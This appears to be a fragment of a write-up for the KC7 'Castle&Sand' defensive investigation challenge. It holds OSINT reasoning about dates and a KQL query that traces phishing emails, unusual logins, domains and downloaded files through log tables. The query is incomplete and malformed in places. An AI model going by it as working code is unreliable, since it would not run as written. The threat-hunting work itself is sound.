Im writing in 2024 and don't know when the challenge was actually released, but probably in 2023?

I refered to the [official github](https://github.com/KC7-Foundation) repository and then [Castle&Sand blame](https://github.com/KC7-Foundation/kc7_data/blame/main/Castle%26Sand/castleandsand.com.md). Latest commit is 10 month old, so that places creation year to 2023! 

Some OSINT: [List of Olympic Games host cities](https://www.wikiwand.com/en/List_of_Olympic_Games_host_cities)

2023 doesnt have Olympic games. Last Winter Olympic games was in China, but that's 2022 and question mentions _a few years ago_. Before China it was South Korea in 2018.

### 3: Search the malicious files found in Q12 on VirusTotal.com. Which file appears to not be malicious? Copy and paste the SHA256 hash.

```sql

| where recipient endswith 'castleandsand.com'
| distinct reply_to;
let affectedEmails = Email
| where sender in (replyToEmails)

let affectedEmployees = Employees
| where email_addr in (affectedEmails)
| distinct username; // 1.
let Q6Output = AuthenticationEvents
| where not( src_ip in (Employees | distinct ip_addr) ) // 2.
| where username in (affectedEmployees) // 3.
| where result == 'Successful Login' // 4.
| distinct src_ip;
let Q9Output = PassiveDns
| where ip in (Q6Output)
| distinct domain;
let requestedFilenames = OutboundNetworkEvents
| where url has_any (Q9Output)
| distinct tostring(parse_path(url).Filename);
let downloadedFiles = FileCreationEvents
| where filename in (requestedFilenames)

let downloadedFilesHosts = FileCreationEvents
| where filename in (requestedFilenames)
| distinct hostname;
let maliciousFiles = FileCreationEvents
